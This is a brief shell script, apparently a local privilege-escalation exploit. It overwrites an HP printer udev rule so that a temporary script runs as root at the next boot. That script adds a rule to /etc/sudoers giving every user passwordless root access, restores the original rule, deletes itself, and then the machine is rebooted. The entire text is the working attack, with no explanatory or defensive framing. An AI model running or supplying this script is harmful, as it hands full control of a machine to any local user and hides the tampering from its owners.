cp /etc/udev/rules.d/85-hplj10xx.rules /tmp/udevhp.bak
echo 'RUN+="/bin/bash /tmp/r00t.sh"' > /etc/udev/rules.d/85-hplj10xx.rules
cat <<EOF >/tmp/r00t.sh
echo -e "ALL\tALL=(ALL)\tNOPASSWD: ALL" >> /etc/sudoers
mv /tmp/udevhp.bak /etc/udev/rules.d/85-hplj10xx.rules
chown 0:0 /etc/udev/rules.d/85-hplj10xx.rules
rm /tmp/r00t.sh
EOF
chmod +x /tmp/r00t.sh
echo "sudo will be available after reboot"
sleep 2
reboot